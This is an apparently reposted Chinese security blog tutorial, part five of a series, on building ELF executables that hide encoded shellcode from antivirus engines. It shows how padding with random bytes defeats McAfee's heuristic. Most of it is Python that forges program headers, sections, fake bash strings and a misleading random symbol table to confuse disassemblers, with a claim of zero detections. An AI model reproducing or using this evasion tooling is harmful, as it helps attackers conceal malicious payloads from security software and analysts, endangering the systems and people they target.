> 原文链接: https://www.anquanke.com//post/id/248688 


# 杀软的无奈-构建更具有欺骗性的ELF文件（五）


                                阅读量   
                                **25283**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01279aa922b3059ec6.jpg)](https://p3.ssl.qhimg.com/t01279aa922b3059ec6.jpg)



## 前言

在上一节我们已经通过自己编写的编码器对shellcode进行了编码，并且构建了一个ELF文件，但是出乎意料的是`McAfee` 和 `McAfee-GW-Edition` 还会报毒为木马，经过我的研究，我发现`McAfee`判黑的逻辑非常简单，只要文件大小小于某个阈值，并且`EntryPoint`附近有无法反汇编的数据，就会被报黑。这么看来，想让上一节的ELF文件不被所有的引擎检测就非常简单了，只需要在文件结尾再写一些乱数据就搞定了。

```
import random
with open(FILENAME,"wb") as fd:
    fd.write( elf_header_bytes + elf_pheader_bytes + shellcode )
    fd.write( bytes( [ random.randint(0x00,0xff) for i in  range(1024)] ) )
```

[![](https://p1.ssl.qhimg.com/t01ee5475868fb18e50.png)](https://p1.ssl.qhimg.com/t01ee5475868fb18e50.png)

经过一步简单的操作就无法被检测出来了，从`McAfee`上的检测逻辑上就可以管中窥豹，看到杀软在做检测时候的无奈，所以恶意代码检测还是非常困难的 …

直接填充垃圾数据来逃过检测肯定不是一个技术爱好者的最终追求，最好的方式还是去做一个真正看起来正常，并且执行起来也正常的ELF，这样才更具备更高的迷惑性。接下来的内容就开始一步步的实现这个目标。



## 链接视图和装载视图

ELF文件是`Executable and Linkable Format`(可执行与可链接格式)的简称，即可以参与执行也可以参与链接。从链接的角度来看，elf文件是`Section`(节)的形式存储的，而在装载的角度上，Elf文件又可以按`Segment`（段）来划分。区别就是在链接视角下，Program Header Table 是可选的，但是Section Header Table是必选的，执行视角的就会反过来。节信息是ELF中信息的组织单元，段信息是节信息的汇总，指出一大段信息(包含若干个节)在加载执行过程中的属性。

[![](https://p2.ssl.qhimg.com/t015184d5bff43683a7.png)](https://p2.ssl.qhimg.com/t015184d5bff43683a7.png)

由于在很多翻译文章中，段和节的概念总是混淆，导致傻傻分不清楚，所以在以后的文章中我们统一约定 `Segment` 为段，`Section`为节。



## 丰富ELF文件的段信息

ELF文件常见的段类型有如下几种:

<th style="text-align: left;">名字</th><th style="text-align: left;">取值</th><th style="text-align: left;">说明</th>
|------
<td style="text-align: left;">PT_NULL</td><td style="text-align: left;">0</td><td style="text-align: left;">表明段未使用，其结构中其他成员都是未定义的。</td>
<td style="text-align: left;">PT_LOAD</td><td style="text-align: left;">1</td><td style="text-align: left;">此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</td>
<td style="text-align: left;">PT_DYNAMIC</td><td style="text-align: left;">2</td><td style="text-align: left;">此类型段给出动态链接信息，指向的是 .dynamic 节。</td>
<td style="text-align: left;">PT_INTERP</td><td style="text-align: left;">3</td><td style="text-align: left;">此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。</td>
<td style="text-align: left;">PT_NOTE</td><td style="text-align: left;">4</td><td style="text-align: left;">此类型段给出附加信息的位置和大小。</td>
<td style="text-align: left;">PT_SHLIB</td><td style="text-align: left;">5</td><td style="text-align: left;">该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合 ABI 标准。</td>
<td style="text-align: left;">PT_PHDR</td><td style="text-align: left;">6</td><td style="text-align: left;">该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。**此外，只有程序头部表是程序的内存映像的一部分时，它才会出现**。如果此类型段存在，则必须在所有可加载段项目的前面。</td>
<td style="text-align: left;">PT_LOPROC~PT_HIPROC</td><td style="text-align: left;">0x70000000 ~0x7fffffff</td><td style="text-align: left;">此范围的类型保留给处理器专用语义。</td>

其中 `PT_LOAD` 和 `PT_DYNAMIC` 这两种类型的段在执行的时候会被加载到内存中去。<br>
现在问题来了，我们现在需要为ELF文件伪造哪些段，并且分别存储什么样的数据才会显得像是一个正常的ELF文件呢？

### <a class="reference-link" name="%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9A%84ELF%E6%96%87%E4%BB%B6"></a>动态链接的ELF文件

**最好的学习方法是模仿**，我们打开一个gcc编译的正常的ELF文件，并采用动态的链接方式：

[![](https://p1.ssl.qhimg.com/t01c444e9ddf5f3257b.png)](https://p1.ssl.qhimg.com/t01c444e9ddf5f3257b.png)

可以看到主要有如下几个的段：
1. PT_PHDR: 不必再解释了。
<li>PT_INERP: 指出了解释器的路径，一般的值为 `/lib/ld-linux.so.2`。 比较有意思的是如果把这个数据给修改了， 文件就无法正常执行了。例如下面的实验：
<pre><code class="lang-bash hljs">$ strings ./a.out    | grep /lib/ld-linux  
/lib/ld-linux.so.3
# 把 PT_INERP 的数据修改为 '/lib/ld-linux.so.3' 

$ ./a.out 
bash: ./a.out: No such file or directory
# 尝试执行就会报错，告诉你 ./a.out 文件存在

$ /lib/ld-linux.so.2  ./a.out 
dds

# 使用 /lib/ld-linux.so.2 进行加载就可以正常执行
</code></pre>
</li>
1. PT_LOAD: 不必再解释了。
1. PT_DYNAMIC: 此类型段给出动态链接信息，指向的是 .dynamic 节。动态链接的ELF文件会有这个段。
1. PT_NOTE: 不必再解释了。
1. PT_GNU_EH_FRAME: 指向 .eh_frame_hdr 节，与异常处理相关，我们暂时先不关注
1. PT_GNU_STACK: 用来标记栈是否可执行的，编译选项 `-z execstack/noexecstack` 的具体实现。
1. PT_GNU_RELRO: relro(read only relocation)安全机制，linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，从定位之后的函数指针被修改。
接下来我们为ELF文件伪造如下段: `PT_PHDR`,`PT_INERP`,`两个PT_LOAD`,`PT_NOTE`，理论上就可以就可以构造一个看起来正常并且可执行的ELF文件了。

但是linux中动态链接的ELF文件和静态链接的ELF文件的加载执行过程还是存在着比较大的差异，这其中涉及到很多我们没有讲到的知识，所以想直接构建出动态链接的ELF文件是有困难的，关于这部分知识我会在以后的ELF壳专题文章中进行详细的拆解。

### <a class="reference-link" name="%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%9A%84ELF%E6%96%87%E4%BB%B6"></a>静态链接的ELF文件

编译一个静态链接的ELF文件，`gcc -m32 test.c  -o test -static`,编译后文件大小是642kb(关于静态链接的背后是怎么实现的，以后再写其他文章进行详解),查看 `Segment` 信息如下：

[![](https://p1.ssl.qhimg.com/t01e9eb8c1c361118d8.png)](https://p1.ssl.qhimg.com/t01e9eb8c1c361118d8.png)

注意 `PT_GNU_RELRO` 段指向的数据和第二个 `PT_LOAD` 段指向的是同一块数据。<br>
接下来我们构造如下的段信息 `两个PT_LOAD`,`PT_NOTE`,`PT_TLS`,`PT_GNU_RELRO`段，我们接着上一节的代码写:

```
if __name__ == "__main__":

    decodeSub,shellcode,length,key =  generate_shikata_block(generate_shellcode())
    print(decodeSub+shellcode,length,key)

    shellcode = xor_encrypt(decodeSub,shellcode,length,key)

    shellcode = "".join( 
            [ 
                chr( i ) for i in shellcode 
            ] 
        ).encode("latin-1")

    # shellcode = pad(shellcode,b=b"\xcc")
    elf_header = build_elf_header()
    pheaders = []

    PHEADERS_LEN = 5
    elf_header.e_phnum = PHEADERS_LEN


    # PT_NOTE_LEN = random.randint(0x50,0x100) //4 * 4

    # 伪造 PT_NOTE 段
    PT_NOTE_LEN = 0x44
    elf_pheader_pt_note = ElfN_Phdr(
        p_type = 0x4,
        p_flags = 0x4, 
        p_offset = c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,

        p_vaddr = c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR,

        p_paddr = c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,

        p_filesz = PT_NOTE_LEN, # 文件大小 
        p_memsz = PT_NOTE_LEN, # 加载到内存中的大小
        p_align = 0x4   
    )


    # 伪造第一个 PT_LOAD 段
    elf_pheader_pt_load_1 = build_elf_pheader()
    elf_pheader_pt_load_1.p_filesz = c.sizeof( elf_header ) 
    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN
    len(shellcode) 

    elf_pheader_pt_load_1.p_memsz  =  c.sizeof( elf_header ) 
    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN
    len(shellcode)

    # 伪造 PT_TLS 
    PT_TLS_LEN = random.randint(0x50,0x100) //4 * 4
    elf_pheader_pt_tls = ElfN_Phdr(
        p_type = 0x7,
        p_flags = 0x4, 
        p_offset =  c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,

        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000,

        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000,

        p_filesz = PT_TLS_LEN , # 文件大小 
        p_memsz = PT_TLS_LEN, # 加载到内存中的大小
        p_align = 0x4
    )

    # 伪造第二个 PT_LOAD 段
    LOADABLE_LEN = random.randint(0x100,0x200)//4 * 4

    elf_pheader_pt_load_2 = ElfN_Phdr(
        p_type = 0x1,
        p_flags = 0x6, 
        p_offset = c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,

        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000,

        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000 ,

        p_filesz = LOADABLE_LEN + PT_TLS_LEN , # 文件大小 
        p_memsz = LOADABLE_LEN + PT_TLS_LEN, # 加载到内存中的大小
        p_align = 0x1000
    )

    # 伪造 PT_GNU_RELRO 段
    elf_pheader_pt_gun_relro = ElfN_Phdr(
        p_type = 1685382482,
        p_flags = 0x6, 
        p_offset = c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,

        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000,

        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + 
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000 ,

        p_filesz = LOADABLE_LEN + PT_TLS_LEN , # 文件大小 
        p_memsz = LOADABLE_LEN + PT_TLS_LEN, # 加载到内存中的大小
        p_align = 0x1
    )

    pheaders = [
        elf_pheader_pt_load_1,elf_pheader_pt_load_2,
        elf_pheader_pt_note,elf_pheader_pt_tls,elf_pheader_pt_gun_relro
    ]

    elf_header.e_entry = elf_pheader_pt_load_1.p_vaddr + \
        c.sizeof( ElfN_Ehdr ) + \
        c.sizeof( ElfN_Phdr ) * PHEADERS_LEN  + PT_NOTE_LEN
    # elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))
    # elf_pheader_bytes = c.string_at(c.addressof(elf_pheader_pt_load_1),c.sizeof(elf_pheader_pt_load_1))

    import random
    with open(FILENAME,"wb") as fd:
        elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))
        fd.write( elf_header_bytes)
        for ph in pheaders:
            fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )

        fd.write( bytes([ random.randint(0x00,0xff) for i in  range(PT_NOTE_LEN)]  ) )
        fd.write(shellcode)

        fd.write( bytes( [ random.randint(0x00,0xff) for i in  range(PT_TLS_LEN)] )  )
        fd.write( bytes( [ random.randint(0x00,0xff) for i in  range(LOADABLE_LEN)] ) )
```

这样伪造的ELF文件大小为1kb，就是彻底的0查杀了。

[![](https://p2.ssl.qhimg.com/t019a985608119761c3.png)](https://p2.ssl.qhimg.com/t019a985608119761c3.png)



## 丰富ELF文件的节信息

`Section`信息对于静态链接的ELF文件来讲是完全不必要的存在，但是如果一个可执行文件没有节信息，那必然看起来很奇怪，势必会引起杀软的关注，那么下面就开始继续伪造ELF文件的节信息。

我们知道，当一个静态链接的二进制没有符号的时候，分析起来是比较困难的，但是如果一个静态链接的二进制全是错误的符号信息，那是不是也能混淆视听呢？ 那好，我们接下来的目标就是构造一堆乱七八糟的符号来误导反汇编的结果。

ELF文件的符号信息主要存储在section `.symtab` 中，首先先来大概的说明一下 `.symtab`符号表的结构，以下以x86为例说明：

```
typedef struct `{`
Elf32_Word st_name;
/*
  是符号名的字符串表示在字符串表中的索引，一般是`.strtab`节中的索引值，如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。
  注:外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。
*/

Elf32_Addr st_value; 
/*
  此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个 绝对值、一个地址等等。
*/
Elf32_Word st_size; 
/*
  很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含 的字节数。如果符号没有大小或者大小未知，则此成员为 0。
*/
unsigned char st_info; 
/*
此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。
*/
unsigned char st_other; 
/*
目前为 0，其含义没有被定义。
*/
Elf32_Half st_shndx;
/*
符号所在的节区索引值
*/
`}`Elf32_sym;
```

st_info 中包含符号类型和绑定信息，操纵方式如:

```
#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)
#define ELF32_ST_TYPE(i) ((i)&amp;0xf)
#define ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf))
```

从中可以看出，st_info 的高四位表示符号绑定，用于确定链接可见性和行为。具体的绑定类型如:

ELF32_ST_BIND 的取值说明如下：

|名称|取值|说明
|------
|STB_LOCAL|0|局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。
|STB_GLOBAL|1|全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的 未定义引用。
|STB_WEAK|2|弱符号与全局符号类似，不过他们的定义优先级比较低。
|STB_LOPROC|13|处于这个范围的取值是保留给处理器专用语义的。
|STB_HIPROC|15|处于这个范围的取值是保留给处理器专用语义的。

ELF32_ST_TYPE 符号类型的定义如下：

<th style="text-align: center;">名称</th><th style="text-align: center;">取值</th><th style="text-align: center;">说明</th>
|------
<td style="text-align: center;">STT_NOTYPE</td><td style="text-align: center;">0</td><td style="text-align: center;">符号的类型没有指定</td>
<td style="text-align: center;">STT_OBJECT</td><td style="text-align: center;">1</td><td style="text-align: center;">符号与某个数据对象相关，比如一个变量、数组等等</td>
<td style="text-align: center;">STT_FUNC</td><td style="text-align: center;">2</td><td style="text-align: center;">符号与某个函数或者其他可执行代码相关</td>
<td style="text-align: center;">STT_SECTION</td><td style="text-align: center;">3</td><td style="text-align: center;">符号与某个节区相关。这种类型的符号表项主要用于重定 位，通常具有 STB_LOCAL 绑定。</td>
<td style="text-align: center;">STT_FILE</td><td style="text-align: center;">4</td><td style="text-align: center;">传统上，符号的名称给出了与目标文件相关的源文件的名 称。文件符号具有 STB_LOCAL 绑定，其节区索引是SHN_ABS，并且它优先于文件的其他 STB_LOCAL 符号 (如果有的话)</td>
<td style="text-align: center;">STT_LOPROC</td><td style="text-align: center;">13</td><td style="text-align: center;">此范围的符号类型值保留给处理器专用语义用途。</td>
<td style="text-align: center;">STT_HIPROC</td><td style="text-align: center;">15</td><td style="text-align: center;">此范围的符号类型值保留给处理器专用语义用途。</td>

接下来我们为ELF文件构造如下的节: `.text`,`.data.rel.ro`,`.symtab`,`.rodata`,`.strtab`,`.shstrtab`。其中 `.shstrtab` 是最后一个节，可以用来定位其他节的名称信息，比较特殊，关于ELF文件节信息的含义不再赘述。

### <a class="reference-link" name="%E5%87%86%E5%A4%87%E4%B8%80%E4%BA%9B%E7%BB%93%E6%9E%84"></a>准备一些结构

首先要定义节表的结构体信息：

```
class ElfN_Shdr(c.Structure):

    _pack_ = 1
    _fields_ = [

        ("sh_name",ElfN_Word),
        ("sh_type",ElfN_Word),
        ("sh_flags",ElfN_Xword),
        ("sh_addr",ElfN_Addr),
        ("sh_offset",ElfN_Off),
        ("sh_size",ElfN_Xword),
        ("sh_link",ElfN_Word),
        ("sh_info",ElfN_Word),
        ("sh_addralign",ElfN_Xword),
        ("sh_entsize",ElfN_Xword)
    ]
```

为了存储符号信息，也需要定义符号表的结构体：

```
class Elf32_Sym(c.Structure):
    ''' 
        // Symbol table entries for ELF32.
        struct Elf32_Sym `{`
            Elf32_Word st_name;     // Symbol name (index into string table)
            Elf32_Addr st_value;    // Value or address associated with the symbol
            Elf32_Word st_size;     // Size of the symbol
            unsigned char st_info;  // Symbol's type and binding attributes
            unsigned char st_other; // Must be zero; reserved
            Elf32_Half st_shndx;    // Which section (header table index) it's defined in
        `}`; 
    '''
    _pack_ = 1
    _fields_ = [
        ("st_name",c.c_uint),
        ("st_value",c.c_uint),
        ("st_size",c.c_uint),
        ("st_info",c.c_ubyte),
        ("st_other",c.c_ubyte),
        ("st_shndx",c.c_ushort)
    ]

class Elf64_Sym(c.Structure):
    ''' 
     // Symbol table entries for ELF64.
        struct Elf64_Sym `{`
            Elf64_Word st_name;     // Symbol name (index into string table)
            unsigned char st_info;  // Symbol's type and binding attributes
            unsigned char st_other; // Must be zero; reserved
            Elf64_Half st_shndx;    // Which section (header tbl index) it's defined in
            Elf64_Addr st_value;    // Value or address associated with the symbol
            Elf64_Xword st_size;    // Size of the symbol 
        `}`
    '''
    _pack_ = 1
    _fields_ = [
        ("st_name",c.c_uint),
        ("st_info",c.c_ubyte),
        ("st_other",c.c_ubyte),
        ("st_shndx",c.c_ushort),
        ("st_value",c.c_ulonglong),
        ("st_size",c.c_ulonglong)
    ]

if ARCH == "x86":
    ElfN_Sym = Elf32_Sym
else:
    ElfN_Sym = Elf64_Sym
```

ELF文件中的字符串也是一个表结构存储的，字符串表是用来存储ELF中会用的各种字符串的值，引用的时候只需要提供字符串索引就够了，为了方便字符串的管理和使用，我们这里定义一个类 `Elf_Str_Table` 来管理字符串。

```
class Elf_Str_Table():

    def __init__(self):
        self.__table = []

    def add(self,string=None,strings=[]):
        # 不能重复
        if string:
            string = string.encode("latin-1")
            if string not in self.__table:
                self.__table.append(string)

        if strings:
            for string in strings:
                string = string.encode("latin-1")
                if string not in self.__table:
                    self.__table.append(string)

        # print( self.__table )

    def index(self,string):
        # 找到 str 在表中的索引
        string = string.encode("latin-1")
        if string in self.__table:
            index = self.__table.index(string)
            # print(index)
            return len(self.dump( index=index ))

        else:
            return 0

    def dump(self,index = -1):

        if index == -1:
            return b"\x00" + b"\x00".join( self.__table ) + b"\x00"
        elif index == 0:
            return b"\x00"
        else:
            return b"\x00" + b"\x00".join( self.__table[0:index] ) + b"\x00"

    def rand(self):
        # 随机选择一个符号的索引
        rand_symbol = random.randint( 0,len(self.__table))
        return len(self.dump(index = rand_symbol))
```

### <a class="reference-link" name="%E6%93%8D%E5%88%80%E5%BC%80%E5%A7%8B%E4%BC%AA%E9%80%A0"></a>操刀开始伪造

我们先确定一个我们最终的ELF文件的布局结构：

```
'''
    最终的 ELF 文件内容部分:

        | elf_header     |
        | program_header | 
        | PT_NOTE        |
        | shellcode      |
        | PT_TLS         |
        | .data.rel.ro   |
        | .data          | # 也是一个需要加载的段
        | shstrtab       | # 节名称字符串表的内容
        | .strtab        |
        | SYMTAB         |
        | section_header |
    '''
```

然后再按照上面确定的布局依次填充内容，修改偏移就可了。首先需要伪造的第一必然是`.shstrtab` 节的内容，因为所有的其他节的名称都是使用的 `.shstrtab`字符串表的索引。然后依次伪造其他的节。

```
# 创建 .shstrtab 节
shstrtab_content = Elf_Str_Table()
shstrtab_content.add(
    strings = [ ".note.ABI-tag",
      ".shstrtab",
      ".note.gnu.build-id",
      ".text",
      ".data.rel.ro",
      ".symtab",
      ".rodata",
      ".strtab",
    ]
)



# 创建 .note.ABI-tag 节    
elf_section_note_abi = ElfN_Shdr(
    sh_name = shstrtab_content.index(".note.ABI-tag") , #fix it 
    sh_type = 0x7,
    sh_flags = 0x2,
    sh_addr = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,
    sh_size = 32,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x4,
    sh_entsize = 0x0
)

# 创建 .note.gnu.build-id
elf_section_note_gnu = ElfN_Shdr(
    sh_name = shstrtab_content.index(".note.gnu.build-id") , #fix it 
    sh_type = 0x7,
    sh_flags = 0x2,
    sh_addr = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR + 32,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + 32  ,
    sh_size = 36,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x4,
    sh_entsize = 0x0
)

# 创建 .text

elf_section_text = ElfN_Shdr(
    sh_name = shstrtab_content.index(".text") , #fix it 
    sh_type = 0x1,
    sh_flags = 0x6,
    sh_addr = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN +  MEM_VADDR ,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN,
    sh_size = len(shellcode) ,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x4,
    sh_entsize = 0x0
)

# 创建 .data.rel.ro
elf_section_data_rel = ElfN_Shdr(
    sh_name = shstrtab_content.index(".data.rel.ro") , #fix it 
    sh_type = 0x1,
    sh_flags = 0x3,
    sh_addr = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ) +  MEM_VADDR ,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ),
    sh_size = LOADABLE_LEN ,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x4,
    sh_entsize = 0x0
)

# 从其他软件中随便抠出来一点字符串来构建 .data 节
# 伪造一些/bin/bash的字符串
data_content = Elf_Str_Table()
data_content.add(
    # /bin/bash 的字符串
    strings = [
        "complete [-abcdefgjksuv] [-pr] [-DE] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [name ...]",
        "compgen [-abcdefgjksuv] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [word]",
        "compopt [-o|+o option] [-DE] [name ...]",
        "mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]",
        "compopt [-o|+o option] [-DE] [name ...]",
        "readarray [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]"
    ]
)

DATA_LEN = len( data_content.dump() )
elf_section_data = ElfN_Shdr(
    sh_name = shstrtab_content.index(".rodata") , #fix it 
    sh_type = 0x1,
    sh_flags = 0x3,
    sh_addr = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) 
    + PT_TLS_LEN + LOADABLE_LEN + MEM_VADDR + 0x1000,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) 
    + PT_TLS_LEN + LOADABLE_LEN ,
    sh_size = DATA_LEN,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x1,
    sh_entsize = 0x0
)

SHSTRTAB_LEN = len( shstrtab_content.dump() )
elf_section_shstrtab = ElfN_Shdr(
    sh_name = shstrtab_content.index(".shstrtab") , #fix it 
    sh_type = 0x3,
    sh_flags = 0x0,
    sh_addr = 0x0,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) 
    + PT_TLS_LEN + LOADABLE_LEN + DATA_LEN ,
    sh_size = SHSTRTAB_LEN,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x1,
    sh_entsize = 0x0
)


# 创建 .strtab
VERB = ["read","write","get","set","thread","start","stop","close","free","_IO"]
NOUN = ["name","value","thread","server","remote","age","table"]
strtab_content = Elf_Str_Table()
for i in range(100):
    tmp = random.choice( VERB ) + "_" + random.choice( NOUN )
    strtab_content.add( string=tmp )

STRTAB_LEN = len(strtab_content.dump())
elf_section_strtab = ElfN_Shdr(
    sh_name = shstrtab_content.index(".strtab") , #fix it 
    sh_type = 0x3,
    sh_flags = 0x0,
    sh_addr = 0x0,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) 
    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN ,
    sh_size = STRTAB_LEN,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x1,
    sh_entsize = 0x0
)
```

下面才是我们的重头戏，开始伪造我们的符号表：

```
# 伪造 .symtab 节的数据

sym_list = []
sym_list_len = 10
# 在 .text 节伪造 10 个函数符号
for i in range(sym_list_len):

        sym_tmp = ElfN_Sym(
            st_name = strtab_content.rand(),
            st_info = (0 &lt;&lt; 4 | 2),
            st_other = 0,
            st_shndx = 0x3, # 所在的节索引，.text节
            # st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \
            # c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,
            st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \
            c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + i*0x20 ,
            # st_value = 0x08048118,
            st_size = 0x20,
        )
        # sym_tmp = ElfN_Sym()
        sym_list.append(sym_tmp)

for i in range(sym_list_len):
    # 在第二个可加载段中伪造 10 个函数符号
    sym_tmp = ElfN_Sym(
        st_name = strtab_content.rand(),
        st_info = (0 &lt;&lt; 4 | 2),
        st_other = 0,
        st_shndx = 0x3, # 所在的节索引，.text节
        # st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \
        # c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,
        st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \
        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + 0x1000 + i*0x40 ,
        # st_value = 0x08048118,
        st_size = 0x40,
    )
    # sym_tmp = ElfN_Sym()
    sym_list.append(sym_tmp)

sym_list_len = len(sym_list)
elf_section_symtab = ElfN_Shdr(
    sh_name = shstrtab_content.index(".symtab") , #fix it 
    sh_type = 0x2,
    sh_flags = 0x0,
    sh_addr = 0x0,
    sh_offset = c.sizeof( ElfN_Ehdr ) + 
    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) 
    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN + STRTAB_LEN ,
    sh_size = sym_list_len * c.sizeof( ElfN_Sym ),
    sh_link = 0x7,
    sh_info = 0, #  a symbol table section's sh_info section header member holds the symbol table index for the first non-local symbol.
    sh_addralign = 0x4,
    sh_entsize =  c.sizeof( ElfN_Sym )
)
```

注意`.symtab`节表的 `sh_info` 表达的含义，乱写可能会导致ida解析出错(被这个问题卡了很久)。最后我们将伪造的所有数据写入一个ELF文件：

```
elf_section_undef = ElfN_Shdr(
    sh_name = 0x0,
    sh_type = 0x0,
    sh_flags = 0x0,
    sh_addr = 0x0,
    sh_offset = 0x0,
    sh_link = 0x0,
    sh_info = 0x0,
    sh_addralign = 0x0,
    sh_entsize = 0x0
)

sections = [
    elf_section_undef,
    elf_section_note_abi,
    elf_section_note_gnu,
    elf_section_text,
    elf_section_data_rel,
    elf_section_data,
    elf_section_symtab,
    elf_section_strtab,
    elf_section_shstrtab,
]
elf_section_symtab.sh_link = sections.index( elf_section_strtab )
e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size
e_shoff_pad = 4 + (4 - (e_shoff &amp; 3)) &amp; 3

elf_header.e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size + e_shoff_pad
